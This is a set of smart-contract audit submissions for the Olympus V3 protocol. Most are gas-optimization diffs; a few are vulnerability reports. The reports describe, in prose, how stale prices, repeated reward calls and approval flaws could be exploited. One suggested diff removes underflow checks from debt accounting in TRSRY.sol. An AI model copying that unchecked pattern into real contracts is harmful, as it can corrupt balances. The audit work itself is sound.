(FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; -        _range.cushion.high.price = +        uint256 _r_cushion_low_price = _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE; +        uint256 _r_cushion_high_price = _range.cushion.high.price =              (movingAverage_ * (FACTOR_SCALE + cushionSpread)) /              FACTOR_SCALE;            emit PricesChanged( -            _range.wall.low.price, -            _range.cushion.low.price, -            _range.cushion.high.price, -            _range.wall.high.price +            _r_wall_low_price , +            _r_cushion_low_price, +            _r_cushion_high_price, +            _r_wall_high_price          );      } ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol 1. Unchecked  ``` git diff diff --git a/src/modules/TRSRY.sol b/src/modules/TRSRY.sol index de9b630..7ec43e1 100644 --- a/src/modules/TRSRY.sol +++ b/src/modules/TRSRY.sol @@ -109,11 +109,14 @@ contract OlympusTreasury is Module, ReentrancyGuard {          uint256 prevBalance = token_.balanceOf(address(this));          token_.safeTransferFrom(msg.sender, address(this), amount_);   -        uint256 received = token_.balanceOf(address(this)) - prevBalance; +        uint256 received; +        unchecked { +            received = token_.balanceOf(address(this)) - prevBalance;   -        // Subtract debt from caller -        reserveDebt[token_][msg.sender] -= received; -        totalDebt[token_] -= received; +            // Subtract debt from caller +            reserveDebt[token_][msg.sender] -= received; +            totalDebt[token_] -= received; +        }            emit DebtRepaid(token_, msg.sender, received);      }  ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol 1. No need to initialize variable to 0. 2. use ++i instead of i++  ``` git diff diff --git a/src/utils/KernelUtils.sol b/src/utils/KernelUtils.sol index 125a674..69f7ea4 100644 --- a/src/utils/KernelUtils.sol +++ b/src/utils/KernelUtils.sol @@ -40,13 +40,13 @@ function ensureContract(address target_) view {  function ensureValidKeycode(Keycode keycode_) pure {      bytes5 unwrapped = Keycode.unwrap(keycode_);   -    for (uint256 i = 0; i < 5; ) { +    for (uint256 i; i < 5; ) {          bytes1 char = unwrapped[i];            if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only            unchecked { -            i++; +            ++i;          }      }  } @@ -55,13 +55,13 @@ function ensureValidKeycode(Keycode keycode_) pure {  function ensureValidRole(Role role_) pure {      bytes32 unwrapped = Role.unwrap(role_);   -    for (uint256 i = 0; i < 32; ) { +    for (uint256 i; i < 32; ) {          bytes1 char = unwrapped[i];          if ((char < 0x61 || char > 0x7A) && char != 0x5f && char != 0x00) {              revert InvalidRole(role_); // a-z only          }          unchecked { -            i++; +            ++i;          }      }  } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol 1. Use unchecked for decimals increment 2. Use pre increment/decrement ``` git diff diff --git a/src/policies/Operator.sol b/src/policies/Operator.sol index 7573526..d8576c1 100644 --- a/src/policies/Operator.sol +++ b/src/policies/Operator.sol @@ -485,7 +485,9 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          int8 decimals;          while (price_ >= 10) {              price_ = price_ / 10; -            decimals++; +            unchecked { +                ++decimals; +            }          }            /// Subtract the stated decimals from the calculated decimals to get the relative price decimals. @@ -683,12 +685,12 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          if (currentPrice <= movingAverage) {              if (!regen.observations[regen.nextObservation]) {                  _status.high.observations[regen.nextObservation] = true; -                _status.high.count++; +                ++_status.high.count;              }          } else {              if (regen.observations[regen.nextObservation]) {                  _status.high.observations[regen.nextObservation] = false; -                _status.high.count--; +                --_status.high.count;              }          } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol 1. Use local variable to refer storage variable ``` git diff diff --git a/src/policies/BondCallback.sol b/src/policies/BondCallback.sol index 4da1a3a..f9fdab1 100644 --- a/src/policies/BondCallback.sol +++ b/src/policies/BondCallback.sol @@ -153,10 +153,12 @@ contract BondCallback is Policy, ReentrancyGuard, IBondCallback {          ERC20 token;          uint256 balance;          uint256 len = tokens_.length; +        //Use local variable to refer storage variable +        OlympusTreasury _TRSRY = TRSRY;          for (uint256 i; i < len; ) {              token = tokens_[i];              balance = token.balanceOf(address(this)); -            token.safeTransfer(address(TRSRY), balance); +            token.safeTransfer(address(_TRSRY), balance);              priorBalances[token] = token.balanceOf(address(this));                unchecked { ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol 1. Use local variable instead of read from memory ``` git diff diff --git a/src/policies/Governance.sol b/src/policies/Governance.sol index 8829e3b..31fc309 100644 --- a/src/policies/Governance.sol +++ b/src/policies/Governance.sol @@ -275,7 +275,9 @@ contract OlympusGovernance is Policy {            Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);   -        for (uint256 step; step < instructions.length; ) { +        // Use local variable instead of read from memory +        uint256 _len = instructions.length; +        for (uint256 step; step < _len; ) {              kernel.executeAction(instructions[step].action, instructions[step].target);              unchecked {                  ++step; ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99   # Vulnerability details  ## Impact In `getloan()` and `replayloan()`, the `safetransfer` and `safetransferfrom` doesn't check the existence of code at the token address. This is a known issue while using solmate's libraries.  Hence this may lead to miscalculation of funds and may lead to loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.  So this will lead to miscalculation and possibly loss of funds  ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99  ## Tools Used Manual code review  ## Recommended Mitigation Steps Use openzeppelin's safeERC20 or implement a code existence check  
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52   # Vulnerability details  ## Impact After contracts are deployed and initialized, the admin address in `Kernel` contract can only be set to a contract. Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).   ## Proof of Concept Admin address can be changed to any address (EOA or contract) in the `executeAction` function in `Kernel`: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253  This piece explicitly allows EOA addresses since the other actions in the function (besides `ChangeExecutor`) are checked to have only a contract as the target (see `ensureContract` function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.  However, in the `store` function in `INSTR`, action target can only be a contract: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52  After the contracts are deployed, `INSTR` will be the only contract that's allowed to call `Kernel.executeAction`: https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220  Thus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the `INSTR` contract needs to be patched and re-deployed to allow non-contract targets.  ## Tools Used  ## Recommended Mitigation Steps Allow EOA addresses as instruction targets or disallow non-contract admin addresses.
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346   # Vulnerability details  ## Description The Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.   ## Impact The worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.   ## Proof of concept  1. Price is X at the start  2. Oracle stops updating for some reason / no one calls beat()  3. Price drops to Y , where Y < low wall centered around X  4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.  ## Recommended mitigation steps: Change modifier onlyWhileActive to add a check for beat out of sync: ``` if (block.timestamp > lastBeat + SYNC_THRESHOLD * frequency()) ```  
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103   # Vulnerability details  ## Impact `beat()` function is allowed to be called by anyone once in `frequency()` period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in `frequency()` period. However if `beat()` was last time called more then `frequency()` time ago then user can execute `beat()` function `(block.timestamp - lastBeat)/frequency()` times in a row in same block and get rewards.  ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103   ## Recommended Mitigation Steps https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103 Change this line to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();` So no matter how much time the `beat()` was no called, it is possible to call it only once per `frequency()`. 
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102   # Vulnerability details  ## Impact Treasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), _checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.  ## Proof of Concept 1. Policy P has getLoan permission 2. setApprovalFor(policy, token, amount) was called to grant P permission to loan amount 3. P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan  ## Recommended Mitigation Steps A separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.  
 # Olympus V3 Findings  ### **Repo that implements suggested changes:** [0xClandestine/2022-08-olympus](https://github.com/0xClandestine/2022-08-olympus)  **Severity:** *Gas Optimization*  **Context:** [INSTR.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44), [PRICE.sol#144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144), [PRICE.sol#135](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#135), [Governance.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L251), [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)   **Description:** Arithmetic checks aren't necessary when logic cannot realistically underflow/overflow.  **Recommendation:**  [INSTR.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44) ```solidity -    uint256 instructionsId = ++totalInstructions; +    uint256 instructionsId; + +    unchecked { +        instructionsId = ++totalInstructions; +    } ```  **Recommendation:**  [PRICE.sol#144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144) ```solidity +    uint256 nextObs = nextObsIndex; // should cache this value  ...  -    nextObsIndex = (nextObsIndex + 1) % numObs; + +    unchecked { +        ++nextObs; +    } + +    nextObsIndex = nextObs % numObs; ```  **Recommendation:**  [PRICE.sol#135](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L135) ```solidity      // overflow/underflow is impossible here because the conditional explicitly checks the arithmetic.     if (currentPrice > earliestPrice) { -        _movingAverage += (currentPrice - earliestPrice) / numObs; + +        unchecked { +            priceDelta = currentPrice - earliestPrice; +        } + +        _movingAverage += priceDelta / numObs;     } else { -        _movingAverage -= (earliestPrice - currentPrice) / numObs; + +        unchecked { +            priceDelta = earliestPrice - currentPrice; +        } + +        _movingAverage -= priceDelta / numObs; +    } ```  **Recommendation:** [Governance.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L251)  ```solidity -    if (for_) { -        yesVotesForProposal[activeProposal.proposalId] += userVotes; -    } else { -        noVotesForProposal[activeProposal.proposalId] += userVotes; -    }      +    // total votes cannot exceed totalSupply +    unchecked { +        if (for_) { +            yesVotesForProposal[activeProposal.proposalId] += userVotes; +        } else { +            noVotesForProposal[activeProposal.proposalId] += userVotes; +        } +    } ```  **Recommendation:** [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  **Note:** Consider setting lastBeat + frequency as an unchecked variable to avoid calculating it 3 times.  ```solidity function beat() external nonReentrant {     if (!active) revert Heart_BeatStopped();  -    if (block.timestamp < lastBeat + frequency())  -        revert Heart_OutOfCycle();  +   unchecked { +       if (block.timestamp < lastBeat + frequency())  +            revert Heart_OutOfCycle(); +   }      // Update the moving average on the Price module     PRICE.updateMovingAverage();      // Trigger price range update and market operations     _operator.operate();      // Update the last beat timestamp -    lastBeat += frequency();  +    unchecked { +        lastBeat += frequency(); +    }      // Issue reward to sender     _issueReward(msg.sender);      emit Beat(block.timestamp); } ``` ___  **Severity:** *Gas Optimization*  **Context:** [PRICE.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L252), [PRICE.sol#L284](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L284)  **Description:** Use [delete](https://docs.soliditylang.org/en/v0.8.0/types.html#delete) keyword when mutating state variables back to null/zero value to receive a gas refund.  **Recommendation:**  [PRICE.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L252) ```solidity -    initialized = false; -    lastObservationTime = 0; -    _movingAverage = 0; -    nextObsIndex = 0;  +    delete initialized; +    delete lastObservationTime; +    delete _movingAverage; +    delete nextObsIndex; ```  **Recommendation:**  [PRICE.sol#L284](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L284) ```solidity -    initialized = false; -    lastObservationTime = 0; -    _movingAverage = 0; -    nextObsIndex = 0;  +    delete initialized; +    delete lastObservationTime; +    delete _movingAverage; +    delete nextObsIndex; ```  ___  **Severity:** *Gas Optimization*  **Context:** [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278), [PRICE.sol#L122](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122), [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  **Description:** Cache state variables and array lengths before readings them multiple times (like in a loop).  **Recommendation:** [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278) ```solidity -    for (uint256 step; step < instructions.length; ) {      +    uint256 instructionsLength = instructions.length; + +    for (uint256 step; step < instructionsLength;) { ```  **Recommendation:** [PRICE.sol#L122](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122) ```solidity  // 2 SLOADs saved  function updateMovingAverage() external permissioned {     // Revert if not initialized     if (!initialized) revert Price_NotInitialized();      // Cache number of observations to save gas.     uint32 numObs = numObservations;  +    // Cache next observation index to save gas. +    uint256 nextObs = nextObsIndex; // avoid SLOADs      // Get earliest observation in window -   uint256 earliestPrice = observations[nextObsIndex]; +   uint256 earliestPrice = observations[nextObs]; // avoid SLOAD      uint256 currentPrice = getCurrentPrice();      // Calculate new moving average     if (currentPrice > earliestPrice) {         _movingAverage += (currentPrice - earliestPrice) / numObs;     } else {         _movingAverage -= (earliestPrice - currentPrice) / numObs;     }      // Push new observation into storage and store timestamp taken at -    observations[nextObsIndex] = currentPrice; +    observations[nextObs] = currentPrice; // avoid SLOAD     lastObservationTime = uint48(block.timestamp); -    nextObsIndex = (nextObsIndex + 1) % numObs; +    nextObsIndex = (nextObs + 1) % numObs; // avoid SLOAD      emit NewObservation(block.timestamp, currentPrice, _movingAverage); } ```   **Recommendation:** [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  ```solidity  // 2 SLOADs saved  function beat() external nonReentrant {     if (!active) revert Heart_BeatStopped();  +    uint256 _lastBeat = lastBeat;  -    if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); +    if (block.timestamp < _lastBeat + frequency()) revert Heart_OutOfCycle();      // Update the moving average on the Price module     PRICE.updateMovingAverage();      // Trigger price range update and market operations     _operator.operate();      // Update the last beat timestamp -    lastBeat += frequency(); +    lastBeat = _lastBeat + frequency(); // += causes another SLOAD      // Issue reward to sender     _issueReward(msg.sender);      emit Beat(block.timestamp); }  ``` ___  **Severity:** *Gas Optimization*  **Context:** [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L194)  **Description:** Mutating a single slot multiple times in a function should be avoided when possible.  **Recommendation:** [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L194)  **Note:** a = a + b or a = a - b is slightly cheaper than a += b or a -= b when mutating mappings. This can be applied other places in the codebase as well.  ```solidity  // 1 SSTORE saved  function endorseProposal(uint256 proposalId_) external {     uint256 userVotes = VOTES.balanceOf(msg.sender);      if (proposalId_ == 0) {         revert CannotEndorseNullProposal();     }      Instruction[] memory instructions = INSTR.getInstructions(proposalId_);     if (instructions.length == 0) {         revert CannotEndorseInvalidProposal();     }      // undo any previous endorsement the user made on these instructions     uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; -    totalEndorsementsForProposal[proposalId_] -= previousEndorsement;      // reapply user endorsements with most up-to-date votes     userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; -    totalEndorsementsForProposal[proposalId_] += userVotes; +    totalEndorsementsForProposal[proposalId_] = totalEndorsementsForProposal[proposalId_] - previousEndorsement + userVotes; // this can potentially be unchecked      emit ProposalEndorsed(proposalId_, msg.sender, userVotes); } ```
 ## 1. ++i costs less gas compared to i++ or i += 1, same for --i/i--. Especially in for loops  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments i and returns the initial value of `i`.  ``` uint i = 1;   i++; // == 1 but i == 2 ``` But ++i returns the actual incremented value: ``` uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ``` In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  I suggest using ++i instead of i++ to increment the value of an uint variable.  If done inside for loop, saves 6 gas per loop.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol ``` 49:         i++; 64:         i++; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol ``` 488:        decimals++; 670:        _status.low.count++; 675:        _status.low.count--; 686:        _status.high.count++; 691:        _status.high.count--; ```  ## 2. Use a more recent version of solidity  - Use a solidity version of at least 0.8.0 to get overflow protection without SafeMath   - Use a solidity version of at least 0.8.2 to get compiler automatic inlining   - Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads   - Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings   - Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value   https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondCallback.sol  ``` 2:   pragma solidity >=0.8.0; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IHeart.sol ``` 2:   pragma solidity >=0.8.0; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol ``` 2:   pragma solidity >=0.8.0;  ```  ## 3. No need to explicitly initialize variables with default values  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: `for (uint256 i = 0; i < reqLength;) {` should be replaced with for `(uint256 i; i < reqLength;) {`  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol ```  397:       for (uint256 i = 0; i < reqLength; ) { ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol ``` 43:       for (uint256 i = 0; i < 5; ) { 58:      for (uint256 i = 0; i < 32; ) { ```  ## 4. \<x\> += \<y\> costs more gas than \<x\> = \<x\> + \<y\> for state variables  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol ``` 96:         reserveDebt[token_][msg.sender] += amount_; 97:         totalDebt[token_] += amount_; 131:        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol ``` 136:        _movingAverage += (currentPrice - earliestPrice) / numObs; 222:        total += startObservations_[i]; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol ``` 58:          balanceOf[to_] += amount_; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol ``` 143:        _amountsPerMarket[id_][0] += inputAmount_; 144:        _amountsPerMarket[id_][1] += outputAmount_; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol ``` 103:        lastBeat += frequency(); ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 198:        totalEndorsementsForProposal[proposalId_] += userVotes; 252:        yesVotesForProposal[activeProposal.proposalId] += userVotes; 254:        noVotesForProposal[activeProposal.proposalId] += userVotes; ```  ## 5. \<array>.length should not be looked up in every loop of a for-loop  The overheads outlined below are PER LOOP, excluding the first loop  - storage arrays incur a Gwarmaccess (100 gas) - memory arrays use MLOAD (3 gas) - calldata arrays use CALLDATALOAD (3 gas)  Caching the length changes each of these to a DUP\<N> (3 gas), and gets rid of the extra DUP\<N> needed to store the stack offset  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 279:        for (uint256 step; step < instructions.length; ) { ```  ## 6. Boolean comparisons  Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value. I suggest using if(directValue) instead of if(directValue == true)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 223:        if (proposalHasBeenActivated[proposalId_] == true) { 306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ## 7 . Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  There are uint8, uint32, uint48 in almost all contracts in scope, they should all be checked and if possible use uint/int. Example: https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol - 31, 32, 33 ```         31:   uint32 count; // current number of price points that count towards regeneration 32:         uint48 lastRegen; // timestamp of the last regeneration 33:         uint32 nextObservation; // index of the next observation in the observations array ```  ## 8. Using bools for storage incurs overhead  // Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and  // pointer aliasing, and it cannot be disabled.  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27  Use uint256(1) and uint256(2) for true/false  All contracts should be checked and if possible avoid using uint instead of bools Example: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol - 113, 181, 197 ``` 113:    bool public isActive; 181:    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; 197:    mapping(Role => bool) public isRole; ```  ## 9. Not using the named return variables when a function returns, wastes deployment gas  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol ``` 493:        return decimals - int8(PRICE.decimals()); ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol ``` 122:        return uint256(PRICE.observationFrequency()); ```  ## 10. Multiplication/division by two should use bit shifting   \<x> * 2 is equivalent to \<x> << 1 and \<x> / 2 is the same as \<x> >> 1. The MUL and DIV opcodes cost 5 gas, whereas SHL and SHR only cost 3 gas  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol - 372, 419, 420, 427, 786 ``` 372:            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 419:            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 420:            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 427:            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 786:            ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61   # Vulnerability details  ## Impact & Proof Of Concept In `INSTR.sol`, it is correctly checked that a `ChangeExecutor` instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid. However, the same problem can occur for `MigrateKernel`. For instance, let's say we have a `MigrateKernel` followed by a `DeactivatePolicy` action. The `MigrateKernel` action will change the value of `kernel` within the policy. The `DeactivatePolicy` action tries to call `setActiveStatus` on the policy. However, this has a `onlyKernel` modifier and the call will therefore fail when it is done after the value of `kernel` was changed.  ## Recommended Mitigation Steps Perform the same check for `MigrateKernel`.
# Low effect on readability  ## [G-01] Use `!= 0` instead of `> 0` for unsigned integers. A `uint` can't be below zero, so `!= 0` is sufficient and is gas more efficient.  1 instance: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247  Consider replacing `>` by `!=`.  *save 3 gas*  ## [G-02] Unnecessary initialization of variable  Some data type have a default value which is already the desired one. The default value of `uint` is `0`, it is so unnecessary to initialize these again.  3 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58  Consider removing `= 0`  *save 3 gas each*  ## [G-03] Transformation of post-increment to pre-increment A pre-increment is cheaper than a post one. When it is possible, it is a good practice to apply pre-increment.  5 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686  Consider transforming those.  With those changes, these evolutions in gas average report can be observe:      Operator: operate: 122263 -> 122255 (-8)  ## [G-04] Expression like `x = x + y` are cheaper than `x += y` for states variables.  4 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L135-L139 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103  Consider replacing `+=` and `-=`   With those changes, these evolutions in gas average report can be observe:      OlympusPrice: Deployment: 1117743 -> 1115143 (-2600)     OlympusHeart: Deployment: 934119 -> 932719 (-1400)     OlympusHeart: beat: 29228 -> 29221 (-7)  ## [G-05] Some operations can be marked unchecked If an operation can't overflow, it is cheaper to mark it as unchecked to avoid the automatic check of overflow. In this case:      while  (price_ >=  10)  {   price_ = price_ /  10;   decimals++;  } The operation can't overflow or undeflow  1 instances  - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L486-L489   Consider marking it unchecked  With this changes, these evolutions in gas average report can be observe:      Operator: Deployment: 4679925 -> 4670317 (-9608)     Operator: operate: 122263 -> 121936 (-327)  This part can already be subjected to two improvements, however this one is still largely ineffective, especially for large numbers up to 2^256. It would be very useful to import a log10 function from an external mathematical library. The gain can be very important.  ## [G-06] Unnecessary public constant Declaring a private constant is cheaper than a public one. In some case, a constant can be declared as private to save gas. It is the case if the constant don't need to be called outside the contract. A user could still read the value directly in the code instead of calling it, if needed.  8 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121-L137 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89  Consider changing those constants to private. (The code still pass all the test with these changes.)  With those changes, these evolutions in gas average report can be observe:      OlympusRange: Deployment: 1125279 -> 1121272 (-4007)     OlympusRange: spread: 655 -> 545 (-110)     OlympusGovernance: Deployment: 1638243 -> 1604601 (-33642)     OlympusGovernance: activateProposal: 52753 -> 